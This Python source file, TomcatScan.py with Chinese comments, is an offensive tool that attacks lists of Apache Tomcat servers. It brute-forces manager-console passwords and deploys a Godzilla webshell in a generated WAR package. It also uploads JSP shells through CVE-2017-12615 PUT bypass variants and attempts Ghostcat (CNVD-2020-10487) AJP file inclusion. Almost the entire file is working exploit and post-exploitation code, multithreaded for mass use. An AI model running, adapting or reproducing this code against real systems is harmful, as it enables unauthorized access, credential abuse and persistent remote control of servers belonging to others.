# -*- coding: utf-8 -*-
# @Time    : 13 1月 2025 11:29 下午
# @Author  : codervibe
# @File    : TomcatScan.py
# @Project : TomcatScan

import logging
import os
import random
import re
import string
import struct
import time
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

import requests
import yaml
from bs4 import BeautifulSoup
from colorama import Fore, Style
from requests.auth import HTTPBasicAuth

from tomcatscan import Tomcat, AjpForwardRequest

# 忽略HTTPS请求中的不安全请求警告
requests.packages.urllib3.disable_warnings()

# 配置日志格式，输出INFO级别及以上的日志消息
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()


# 加载配置文件
def load_config(config_file):
    """
    从指定的YAML配置文件中加载配置。

    参数:
        config_file (str): 配置文件路径

    返回:
        dict: 加载的配置字典
    """
    with open(config_file, 'r', encoding='utf-8') as file:
        return yaml.safe_load(file)


# 通用文件读取函数：用于加载用户名、密码或URL列表文件
def load_file(file_path):
    """
    读取指定文件内容并返回一个包含每行内容的列表。

    参数:
        file_path (str): 文件路径

    返回:
        list: 每行的内容组成的列表
    """
    if not os.path.isfile(file_path):
        logger.error(f"文件 {file_path} 不存在")
        return []
    with open(file_path, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines()]


# 清理URL以确保路径正确
def clean_url(url):
    """
    清理URL以确保路径正确。

    参数:
        url (str): 原始URL

    返回:
        str: 清理后的URL
    """
    return url.rstrip('/manager/html')


# 生成随机的6位数字字母组合，用于WAR包和JSP文件名
def generate_random_string(length=6):
    """
    生成指定长度的随机字符串，包含字母和数字。

    参数:
        length (int): 字符串长度，默认为6

    返回:
        str: 生成的随机字符串
    """
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


# 生成 WAR 文件，其中包含 Godzilla Webshell
def generate_war(config):
    """
    生成包含Godzilla Webshell的WAR文件，并创建临时JSP文件。

    参数:
        config (dict): 配置字典，包含shell内容

    返回:
        tuple: 包含WAR文件名、随机字符串和JSP文件名的元组
    """
    shell_content = config['files'].get('shell_file_content', '<%-- 默认的 shell.jsp 内容 --%>')
    random_string = generate_random_string()
    war_file_name = f"{random_string}.war"
    shell_file_name = f"{generate_random_string()}.jsp"

    try:
        # 创建临时 JSP 文件
        with open(shell_file_name, 'w', encoding='utf-8') as jsp_file:
            jsp_file.write(shell_content)

        # 生成 WAR 包
        with zipfile.ZipFile(war_file_name, 'w', zipfile.ZIP_DEFLATED) as war:
            war.write(shell_file_name, shell_file_name)

        # 删除临时 JSP 文件
        os.remove(shell_file_name)

        return war_file_name, random_string, shell_file_name
    except Exception as e:
        logger.error(f"[-] WAR 包生成失败: {str(e)}")
        return None, None, None


# 获取登录后的JSESSIONID和CSRF_NONCE，用于进一步的WAR文件上传
def get_jsessionid_and_csrf_nonce(url, username, password):
    """
    获取登录后的JSESSIONID和CSRF_NONCE，用于进一步的WAR文件上传。

    参数:
        url (str): 目标URL
        username (str): 用户名
        password (str): 密码

    返回:
        tuple: 包含JSESSIONID、CSRF_NONCE、文件上传字段名和成功标志的元组
    """
    try:
        login_url = f"{url}/manager/html"
        response = requests.get(login_url, auth=HTTPBasicAuth(username, password), verify=False, timeout=3)
        response.raise_for_status()

        cookies = response.cookies
        jsessionid = cookies.get('JSESSIONID')
        if not jsessionid:
            return None, None, None, False

        # 使用 BeautifulSoup 解析 HTML 并提取 CSRF_NONCE 和文件上传字段名
        soup = BeautifulSoup(response.text, 'html.parser')

        # 提取 CSRF_NONCE 值
        csrf_nonce_match = re.search(r'org\.apache\.catalina\.filters\.CSRF_NONCE=([A-F0-9]+)', response.text)
        csrf_nonce = csrf_nonce_match.group(1) if csrf_nonce_match else None

        # 提取文件上传字段名
        file_input = soup.find('input', {'type': 'file'})
        file_field_name = file_input['name'] if file_input else 'file'

        return jsessionid, csrf_nonce, file_field_name, True
    except requests.exceptions.RequestException as e:
        logger.warning(f"{Fore.YELLOW}[!] 网络错误 {url}: {str(e)}{Style.RESET_ALL}")
        return None, None, None, False


# 部署 Godzilla Webshell 并尝试访问上传的 Webshell
def deploy_godzilla_war(url, username, password, war_file_path, random_string, shell_file_name, output_file,
                        max_retries, retry_delay):
    """
    部署Godzilla Webshell并尝试访问上传的Webshell。

    参数:
        url (str): 目标URL
        username (str): 用户名
        password (str): 密码
        war_file_path (str): WAR文件路径
        random_string (str): 随机字符串
        shell_file_name (str): JSP文件名
        output_file (str): 输出文件路径
        max_retries (int): 最大重试次数
        retry_delay (int): 重试延迟时间（秒）

    返回:
        None
    """
    url = clean_url(url)  # 清理 URL，确保格式正确
    jsessionid, csrf_nonce, file_field_name, success = get_jsessionid_and_csrf_nonce(url, username, password)

    if not success:
        # 如果未能获取 JSESSIONID、csrf_nonce，则删除 WAR 文件
        if os.path.isfile(war_file_path):
            try:
                os.remove(war_file_path)
            except OSError as e:
                logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")
        return

    attempt = 0
    while attempt < max_retries:
        try:
            # 使用获取到的 JSESSIONID 和 CSRF_NONCE 进行上传
            deploy_url = f"{url}/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE={csrf_nonce}"
            cookies = {'JSESSIONID': jsessionid}
            with open(war_file_path, 'rb') as war_file:
                files = {file_field_name: (os.path.basename(war_file_path), war_file, 'application/octet-stream')}
                response = requests.post(deploy_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                         files=files, verify=False, timeout=3)
            response.raise_for_status()
            shell_url = f"{url}/{random_string}/{shell_file_name}"
            shell_response = requests.get(shell_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                          verify=False, timeout=3)
            if shell_response.status_code == 200:
                logger.info(f"{Fore.RED}[+] 成功获取 Webshell: {shell_url}{Style.RESET_ALL}")
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write(f"{url} {username}:{password} - Webshell: {shell_url}\n")
            else:
                logger.warning(f"{Fore.YELLOW}[!] 获取 Webshell 失败: {shell_url} {Style.RESET_ALL}")
            break  # 成功后退出循环
        except requests.exceptions.RequestException as e:
            logger.warning(f"{Fore.YELLOW}[!] 网站访问失败 {url}: {str(e)}{Style.RESET_ALL}")

        attempt += 1
        if attempt < max_retries:
            logger.info(f"{Fore.CYAN}[!] 重试上传 ({attempt}/{max_retries})...{Style.RESET_ALL}")
            time.sleep(retry_delay)  # 重试前等待设定时间

    # 上传成功或失败后，删除 WAR 文件
    if os.path.isfile(war_file_path):
        try:
            os.remove(war_file_path)
        except OSError as e:
            logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")


# 弱口令检测函数
def check_weak_password(url, usernames, passwords, output_file, max_retries, retry_delay, config):
    """
    检测弱口令并记录成功登录的信息。

    参数:
        url (str): 目标URL
        usernames (list): 用户名列表
        passwords (list): 密码列表
        output_file (str): 输出文件路径
        max_retries (int): 最大重试次数
        retry_delay (int): 重试延迟时间（秒）
        config (dict): 配置字典

    返回:
        tuple: 包含成功登录的URL、用户名和密码的元组
    """
    base_url = url.rstrip('/')
    if not base_url.endswith('/manager/html'):
        url_with_path = f"{base_url}/manager/html"
    else:
        url_with_path = url

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }

    attempt = 0
    while attempt < max_retries:
        try:
            for username in usernames:
                for password in passwords:
                    response = requests.get(url=url_with_path, auth=HTTPBasicAuth(username, password), headers=headers,
                                            timeout=10, verify=False)
                    if response.status_code == 200:
                        success_entry = f"{url_with_path} {username}:{password}"
                        logger.info(f"{Fore.RED}[+] 登录成功 {success_entry}{Style.RESET_ALL}")
                        with open(output_file, 'a', encoding='utf-8') as f:
                            f.write(success_entry + "\n")

                        # 登录成功后生成WAR文件
                        war_file_name, random_string, shell_file_name = generate_war(config)
                        if war_file_name:
                            # 部署 Godzilla WAR 包并尝试获取 shell
                            deploy_godzilla_war(url_with_path, username, password, war_file_name, random_string,
                                                shell_file_name,
                                                output_file,
                                                config['retry']['deploy_godzilla_war']['max_retries'],
                                                config['retry']['deploy_godzilla_war']['retry_delay'])
                        return (url_with_path, username, password)
                    else:
                        logger.info(
                            f"{Fore.GREEN}[-] 失败: {username}:{password} {Fore.WHITE}({response.status_code}) {Fore.BLUE}{url_with_path}{Style.RESET_ALL}")
            break  # 如果检查完所有用户密码对则退出循环
        except requests.exceptions.RequestException as e:
            logger.warning(
                f"{Fore.YELLOW}[!] 网站无法访问 {url_with_path} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
            time.sleep(retry_delay)  # 重试前等待
            attempt += 1
    if attempt == max_retries:
        logger.error(
            f"{Fore.CYAN}[*] 最大重试次数已达，无法访问 {url_with_path}，将该 URL 从检测列表中移除 {Style.RESET_ALL}")
        return None  # 返回 None 表示该 URL 无法访问

    return url, None, None


# 动态调整线程池大小，确保资源使用合理
def adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread):
    """
    根据用户名和密码组合总数动态调整线程池大小。

    参数:
        combination_count (int): 用户名和密码组合总数
        max_workers_limit (int): 线程池最大限制
        min_workers (int): 线程池最小值
        combination_per_thread (int): 每个线程处理的组合数

    返回:
        int: 调整后的线程池大小
    """
    if combination_count <= 0:
        return min_workers
    # 根据用户配置的每多少个组合分配一个线程，并确保至少有min_workers个线程
    calculated_workers = max((combination_count + combination_per_thread - 1) // combination_per_thread, min_workers)

    # 保证线程数不超过max_workers_limit
    workers = min(calculated_workers, max_workers_limit)
    logger.info(f"根据用户名和密码组合总数 {combination_count} 调整线程池大小为 {workers}")
    return workers


def validate_config(config):
    """
    验证配置文件是否包含必要的字段。

    参数:
        config (dict): 配置字典

    返回:
        bool: 配置是否有效
    """
    required_fields = {
        'files': ['url_file', 'user_file', 'passwd_file', 'output_file', 'shell_file_content'],
        'retry': ['check_weak_password', 'deploy_godzilla_war'],
        'thread_pool': ['max_workers_limit', 'min_workers', 'combination_per_thread']
    }

    for section, fields in required_fields.items():
        if section not in config:
            logger.error(f"配置文件中缺少 {section} 部分")
            return False
        for field in fields:
            if field not in config[section]:
                logger.error(f"配置文件中 {section} 部分缺少 {field} 字段")
                return False

    return True


def pack_string(s):
    """
    打包字符串，添加长度信息。

    参数:
        s (str): 输入字符串

    返回:
        bytes: 打包后的字节数据
    """
    if s is None:
        return struct.pack(">h", -1)
    l = len(s)
    return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)


def unpack(stream, fmt):
    """
    解包字节流。

    参数:
        stream (io.BytesIO): 字节流
        fmt (str): 解包格式

    返回:
        tuple: 解包后的数据
    """
    size = struct.calcsize(fmt)
    buf = stream.read(size)
    return struct.unpack(fmt, buf)


def unpack_string(stream):
    """
    解包字符串。

    参数:
        stream (io.BytesIO): 字节流

    返回:
        str: 解包后的字符串
    """
    size, = unpack(stream, ">h")
    if size == -1:  # null string
        return None
    res, = unpack(stream, "%ds" % size)
    stream.read(1)  # \0
    return res


def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
    """
    准备AJP Forward请求。

    参数:
        target_host: 目标主机
        req_uri: 请求URI
        method: 请求方法，默认为GET
    返回:
        AjpForwardRequest: 准备好的请求对象
    """
    # 创建一个AJP Forward请求对象，用于从服务器到容器的通信
    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)

    # 设置请求的方法，如GET、POST等
    fr.method = method

    # 设置请求使用的协议版本
    fr.protocol = "HTTP/1.1"

    # 设置请求的统一资源标识符
    fr.req_uri = req_uri

    # 设置目标主机的地址，即请求发送到的地址
    fr.remote_addr = target_host

    # 设置目标主机的主机名，这里选择不设置
    fr.remote_host = None

    # 设置服务器的名称，即请求的目标服务器
    fr.server_name = target_host

    # 设置服务器的端口号，默认为80
    fr.server_port = 80

    # 初始化请求头字典，用于设置HTTP请求的各种头部信息
    fr.request_headers = {
        'SC_REQ_ACCEPT': 'text/html',
        'SC_REQ_CONNECTION': 'keep-alive',
        'SC_REQ_CONTENT_LENGTH': '0',
        'SC_REQ_HOST': target_host,
        'SC_REQ_USER_AGENT': 'Mozilla',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }

    # 设置请求是否通过SSL进行传输
    fr.is_ssl = False

    # 初始化请求的属性列表，用于携带额外的请求信息
    fr.attributes = []

    # 返回配置好的AJP Forward请求对象
    return fr


# CVE-2017-12615与CNVD_2020_10487漏洞检测函数
def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
    """
    检测给定URL是否存在CVE-2017-12615或CNVD_2020_10487漏洞。

    参数:
    - url: 目标URL。
    - config: 配置信息字典。

    返回:
    - success: 漏洞利用是否成功。
    - vuln_type: 漏洞类型。
    - exploit_url: 漏洞利用的URL。
    """
    try:
        # 生成随机JSP文件名和shell内容
        jsp_file_name = f"{generate_random_string()}.jsp"
        shell_file_content = config['files'].get('shell_file_content', '<%-- 默认的 shell 内容 --%>')

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Connection": "close",
            "Content-Type": "application/octet-stream"
        }

        # 清理 URL 确保正确格式
        url = clean_url(url)

        # 1. 检测CVE-2017-12615漏洞 (PUT方法上传JSP)
        exploit_methods = [
            f"{url}/{jsp_file_name}/",  # 利用方式 1: PUT /222.jsp/
            f"{url}/{jsp_file_name}%20",  # 利用方式 2: PUT /222.jsp%20
            f"{url}/{jsp_file_name}::$DATA"  # 利用方式 3: PUT /222.jsp::$DATA
        ]

        for idx, method_url in enumerate(exploit_methods):
            response = requests.put(method_url, data=shell_file_content, headers=headers, verify=False, timeout=3)
            if response.status_code in [201, 204]:
                check_url = f"{url}/{jsp_file_name}"
                check_response = requests.get(check_url, verify=False, timeout=3)

                if check_response.status_code == 200:
                    logger.info(
                        f"{Fore.RED}[+] CVE-2017-12615 远程代码执行成功: {check_url} {Style.RESET_ALL} (利用方式: {method_url})")
                    return True, "CVE-2017-12615", check_url  # 返回漏洞类型和URL
                else:
                    logger.warning(
                        f"{Fore.RED}[!] CVE-2017-12615 文件上传成功，但访问失败: {check_url} {Style.RESET_ALL}")
            else:
                logger.warning(
                    f"{Fore.GREEN}[-] 失败: CVE-2017-12615 漏洞利用方式{idx + 1} {Fore.WHITE}({response.status_code}) {Fore.BLUE}{method_url} {Style.RESET_ALL}")

        # 2. 检测CNVD-2020-10487漏洞 (AJP协议漏洞本地文件包含)
        try:
            parsed_url = urlparse(url)  # 解析 URL 并提取主机名
            target_host = parsed_url.hostname  # 自动去掉端口号
            # 从配置文件中读取 CNVD-2020-10487 的 AJP 端口、文件路径和判断条件
            target_port = config['cnvd_2020_10487']['port']
            file_path = config['cnvd_2020_10487']['file_path']
            lfi_check = config['cnvd_2020_10487']['lfi_check']  #

            # 初始化Tomcat AJP连接
            t = Tomcat(target_host, target_port)

            # 发送请求，尝试进行LFI (本地文件包含)
            _, data = t.perform_request('/asdf', attributes=[
                {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', file_path]},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']}
            ])

            if data:
                result_data = "".join([d.data.decode('utf-8') for d in data])
                if lfi_check in result_data:
                    logger.info(
                        f"{Fore.RED}[+] CNVD-2020-10487 本地文件包含成功: {target_host}:{target_port} {Style.RESET_ALL}")
                    return True, "CNVD-2020-10487", f"ajp://{target_host}:{target_port}/WEB-INF/web.xml"  # 返回漏洞类型和URL
        except Exception as e:
            logger.warning(
                f"{Fore.GREEN}[-] 失败: CNVD-2020-10487 {Fore.BLUE}{url} {Fore.YELLOW}{str(e)} {Style.RESET_ALL}")

        return False, None, None  # 如果两个漏洞都未被利用成功，返回默认的失败值

    except requests.exceptions.RequestException as e:
        return False, None, None


# 在每个URL上执行CVE-2017-12615、CNVD_2020_10487检测并继续进行弱口令检测
def detect_and_check(url, usernames, passwords, output_file, config):
    """
    对给定URL进行漏洞检测，并记录结果。

    参数:
    - url: 目标URL。
    - usernames: 用户名列表。
    - passwords: 密码列表。
    - output_file: 结果输出文件名。
    - config: 配置信息字典。
    """
    # 先进行CVE-2017-12615检测
    success, vuln_type, exploit_url = check_cve_2017_12615_and_cnvd_2020_10487(url, config)

    if success:
        target_host = url.split("://")[-1].split("/")[0]
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(f"{target_host} - {vuln_type} Exploited: {exploit_url}\n")

    # 无论漏洞利用成功与否，都进行弱口令检测
    check_weak_password(url, usernames, passwords, output_file,
                        config['retry']['check_weak_password']['max_retries'],
                        config['retry']['check_weak_password']['retry_delay'],
                        config)


# 主函数
def main():
    """
    主函数，负责加载配置、初始化资源并启动漏洞检测流程。
    """
    # 加载配置文件
    config = load_config("config.yaml")

    # 验证配置文件
    if not validate_config(config):
        return

    # 加载 URL、用户名和密码文件
    urls = load_file(config['files']['url_file'])
    usernames = load_file(config['files']['user_file'])
    passwords = load_file(config['files']['passwd_file'])
    output_file = config['files']['output_file']

    # 获取线程池配置
    max_workers_limit = config['thread_pool']['max_workers_limit']
    min_workers = config['thread_pool']['min_workers']
    combination_per_thread = config['thread_pool'].get('combination_per_thread', 200)  # 默认200

    # 计算用户名和密码组合总数
    combination_count = len(urls) * len(usernames) * len(passwords)

    # 根据组合总数调整线程池大小
    workers = adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread)

    # 使用线程池执行检测任务
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [
            executor.submit(detect_and_check, url, usernames, passwords, output_file, config) for url in urls
        ]

        # 等待所有任务完成
        for future in as_completed(futures):
            result = future.result()


if __name__ == "__main__":
    main()
